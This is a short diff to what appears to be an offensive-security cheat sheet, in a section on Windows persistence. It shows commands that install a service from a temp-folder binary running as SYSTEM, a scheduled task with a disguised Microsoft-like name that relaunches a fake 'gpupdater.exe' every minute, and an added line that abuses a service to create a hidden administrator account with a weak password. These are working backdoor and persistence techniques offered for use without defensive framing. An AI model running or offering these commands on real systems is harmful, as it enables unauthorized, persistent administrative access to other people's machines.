@@ -475,6 +475,7 @@ Persistance
 
   shell sc create MyService binpath= c:\windows\temp\https-local-svc-x64.exe start= auto
   Run as System: sc config MyService obj= ".\LocalSystem" password= ""
+  Create Admins: sc config MyService binpath= "cmd /c net user bob Password123! /add & cmd /c net localgroup Administrators bob /add" start= "auto"
   
   schtasks /create /f /sc minute /mo 1 /tn "Microsoft\Windows\WwanSvc\WUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist | findstr.exe gpupdater.exe || start c:\windows\system32\gpupdater.exe"
     Runs every 1 minute to see if gpupdater.exe process is not running and restart it if not
